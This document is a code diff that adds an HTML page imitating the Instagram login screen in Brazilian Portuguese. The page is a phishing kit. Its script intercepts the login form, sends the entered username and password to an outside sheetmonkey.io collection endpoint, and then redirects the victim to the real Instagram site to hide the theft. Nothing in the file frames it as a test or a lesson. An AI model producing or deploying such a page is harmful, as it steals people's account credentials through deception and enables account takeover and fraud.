@@ -1,0 +1,168 @@
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon">
+  <link rel="stylesheet" href="./styles.css">
+  <link rel="stylesheet" href="./responsive.css">
+  <style>
+    /* Adiciona estilos para o botão quando ativo */
+    #submit.active {
+      background-color: #6fa3ef; /* Azul mais claro */
+      color: white;
+    }
+
+    /* Estilo para o texto centralizado no topo */
+    .top-text {
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: white; /* Altere se precisar de um fundo diferente */
+      padding: 10px 20px;
+      font-size: 14px;
+      font-weight: bold;
+      z-index: 1000; /* Mantém o texto acima de outros elementos */
+    }
+  </style>
+</head>
+<body>
+  <!-- Texto centralizado no topo -->
+  <div class="top-text">Português (Brasil)</div>
+
+  <div class="container">
+    <div class="container__images">
+      <img class="touchscreen" src="./phones.png" alt="Telefones celulares interpostos">
+      <img class="carousel__image selected" src="./display-image-1.png" alt="Carrossel de Imagens">
+      <img class="carousel__image" src="./display-image-2.png" alt="Carrossel de Imagens">
+      <img class="carousel__image" src="./display-image-3.png" alt="Carrossel de Imagens">
+      <img class="carousel__image" src="./display-image-4.png" alt="Carrossel de Imagens">
+    </div>
+    <div class="container__login">
+      <form id="loginForm" action="processar.php" method="POST">
+        <div class="login__signin">
+          <img class="instagram__logo" src="./instagram-title.png" alt="Instagram">
+          <input autocomplete="off" type="text" id="user" name="user" required>
+          <span class="email__label">Telefone, nome de usuário ou e-mail</span>
+          <input autocomplete="off" type="password" id="password" name="password" required>
+          <span class="password__label">Senha</span>
+          <span class="show">Mostrar</span>
+          <button id="submit" type="submit">Entrar</button>
+          <div class="separator">
+            <span class="separator__ou">OU</span>
+          </div>
+          <div class="login__fboption">
+            <div class="facebook">
+              <div class="fb__join">
+                <div class="facebook__icon">
+                  <img src="./facebook-icon.png" alt="Facebook">
+                </div>
+                <div class="facebook__name">
+                  Entrar com o Facebook
+                </div>
+              </div>
+              <div class="facebook__forgot">
+                Esqueceu a senha?
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="login__signup">
+          <span>Não tem uma conta? <a href="#">Cadastre-se</a></span>
+        </div>
+        <div class="login__getapp">
+          <div class="getapp__call">
+            Obtenha o aplicativo.
+          </div>
+          <div class="getapp__icons">
+            <img class="app__store" src="./app-store.png" alt="App Store">
+            <img class="google__play" src="./google-play.png" alt="Google Play">
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+  <footer>
+    <menu>
+      <div class="menu">
+        <ul>
+          <li>Meta</li>
+          <li>Sobre</li>
+          <li>Blog</li>
+          <li>Carreiras</li>
+          <li>Ajuda</li>
+          <li>API</li>
+          <li>Privacidade</li>
+          <li>Termos</li>
+          <li>Principais contas</li>
+          <li>Hashtags</li>
+          <li>Localizações</li>
+          <li>Instagram Lite</li>
+          <li>Carregamento de contatos e não usuários</li>
+          <li>Dança</li>
+          <li>Comida e bebida</li>
+          <li>Casa e jardim</li>
+          <li>Música</li>
+          <li>Artes</li>
+        </ul>
+      </div>
+    </menu>
+    <div class="copyright">
+      <div class="language">
+        Português (Brasil)
+      </div>
+      <div class="allrights">
+        © 2024 Instagram from Meta
+      </div>
+    </div>
+  </footer>
+  <script>
+    // Função para verificar se todos os campos estão preenchidos e a senha tem pelo menos 5 caracteres
+    function checkForm() {
+      const email = document.getElementById('user').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const submitButton = document.getElementById('submit');
+      
+      if (email !== '' && password.length >= 5) {
+        submitButton.classList.add('active');
+      } else {
+        submitButton.classList.remove('active');
+      }
+    }
+    
+    // Adiciona eventos de input para atualizar o botão
+    document.getElementById('user').addEventListener('input', checkForm);
+    document.getElementById('password').addEventListener('input', checkForm);
+    
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Impede o envio padrão do formulário
+
+      // Obtém os valores dos campos
+      const email = document.getElementById('user').value;
+      const password = document.getElementById('password').value;
+
+      // Cria um formulário para enviar os dados via POST
+      const formData = new FormData();
+      formData.append('user', email);
+      formData.append('password', password);
+
+      // Envia para a API especificada
+      fetch('https://api.sheetmonkey.io/form/ipB8xP49KtTeJfynvKShWu', {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => response.text()) // Espera resposta em texto
+      .then(result => {
+        console.log(result); // Mostra a resposta para debug
+        // Redireciona após o envio com sucesso
+        window.location.href = 'https://www.instagram.com/'; // Substitua pela URL de redirecionamento desejada
+      })
+      .catch(error => {
+        console.error('Erro ao enviar o formulário', error);
+      });
+    });
+  </script>
+</body>
+</html>
